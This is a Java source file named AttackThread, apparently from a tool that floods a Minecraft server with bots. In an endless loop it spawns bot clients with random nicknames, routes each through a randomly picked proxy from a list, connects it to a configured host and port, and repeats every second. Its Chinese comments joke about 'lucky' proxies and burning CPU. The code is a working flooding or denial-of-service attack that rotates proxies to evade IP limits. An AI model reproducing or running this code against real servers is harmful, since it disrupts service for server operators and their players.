package xyz.zihaoxu;

import com.github.steveice10.packetlib.ProxyInfo;
import xyz.zihaoxu.Listeners.Listener;
import xyz.zihaoxu.protocol.Bot;

import java.lang.reflect.InvocationTargetException;
import java.net.InetSocketAddress;
import java.util.Random;

public class AttackThread implements Runnable{ // AttackThread
    @Override
    public void run() {
        while (true){
            try {
                String nickname= Configure.generate_random_name(Configure.name_prefix);
                // String name = Configure.generateRandomName(Configure.name_prefix);
                System.out.println(nickname+" Creating");
                ProxyInfo proxy=null;
                if(Configure.proxies !=null){ // 这里是随机抽取一位幸运代理
                    String proxy_addr= Configure.proxies.get(new Random().nextInt(Configure.proxies.size()));
                    proxy=new ProxyInfo(
                            Configure.proxy_type,
                            new InetSocketAddress(
                                    proxy_addr.split(":")[0],
                                    Integer.parseInt(proxy_addr.split(":")[1])
                            )
                    );
                }
                Bot bot=new Bot( // Bot bot=new Bot(
                        Configure.host, // Configure.host,
                        Configure.port, // Configure.port,
                        nickname, // name,
                        proxy // proxy_info
                );
                if (!Configure.should_add_listener){
                    bot.addListener(new Listener(bot.getScript())); // bot.addListener(new Listener());
                }
                bot.run(); // bot.connect();
//                while (bot.client.isConnected()){
//
//                }
                bot.client =null;
                // System.gc(); // 看到这里的应该知道为什么我说烧cpu了
                Thread.sleep(1000);
                bot=null;
            } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | NoSuchMethodException |
                     InvocationTargetException | InterruptedException e) {
                throw new RuntimeException(e); // 我觉得这个东西属于多余
            }
        }
    }
}